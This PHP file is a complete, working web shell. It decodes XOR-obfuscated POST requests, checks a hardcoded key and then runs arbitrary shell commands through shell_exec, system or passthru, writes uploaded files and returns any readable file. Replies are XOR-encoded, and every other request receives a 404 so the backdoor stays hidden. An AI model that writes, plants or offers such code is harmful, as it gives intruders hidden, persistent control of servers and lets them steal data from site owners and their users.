<?php

$key = "pkmkb";

function xortext($data, $key) {
    $output = '';
    $data_len = strlen($data);
    $key_len = strlen($key);
    for ($i = 0; $i < $data_len; $i++) {
        $output .= $data[$i] ^ $key[$i % $key_len];
    }
    return $output;
}

if (isset($_POST['data'])) {
    $encoded_data = $_POST['data'];
    $decoded_data = xortext($encoded_data, $key);
    $request = json_decode($decoded_data, true);

    if (isset($request['auth_key']) && $request['auth_key'] === $key) {
        $response_output = '';

        if (isset($request['cmd'])) {
            $cmd = $request['cmd'];
            
            if (function_exists('shell_exec')) {
                $response_output = @shell_exec($cmd . ' 2>&1');
            } elseif (function_exists('system')) {
                ob_start(); 
                @system($cmd . ' 2>&1');
                $response_output = ob_get_clean(); 
            } elseif (function_exists('passthru')) {
                ob_start();
                @passthru($cmd . ' 2>&1');
                $response_output = ob_get_clean();
            } else {
                $response_output = "Command execution disabled.";
            }
        } 
        elseif (isset($request['action']) && $request['action'] === 'upload') {
            if (isset($request['filename']) && isset($request['file_content'])) {
                $filename = $request['filename'];
                $file_content_b64 = $request['file_content'];
                $file_content = base64_decode($file_content_b64);

                if (@file_put_contents($filename, $file_content) !== false) {
                    $response_output = "Uploaded '$filename'.";
                } else {
                    $response_output = "Write error: '$filename'.";
                }
            } else {
                $response_output = "Missing file or path.";
            }
        }
        elseif (isset($request['action']) && $request['action'] === 'download') {
            if (isset($request['filename'])) {
                $filename = $request['filename'];
                
                if (@file_exists($filename) && @is_readable($filename)) {
                    $file_content = @file_get_contents($filename);
                    if ($file_content !== false) {
                        $response_output = base64_encode($file_content);
                    } else {
                        $response_output = "Read error: '$filename'.";
                    }
                } else {
                    $response_output = "File not found or unreadable: '$filename'.";
                }
            } else {
                $response_output = "Missing filename.";
            }
        }
        else {
            $response_output = "Invalid action or command.";
        }

        echo xortext($response_output, $key);

    } else {
        http_response_code(404);
    }
} else {
    http_response_code(404);
}
?>
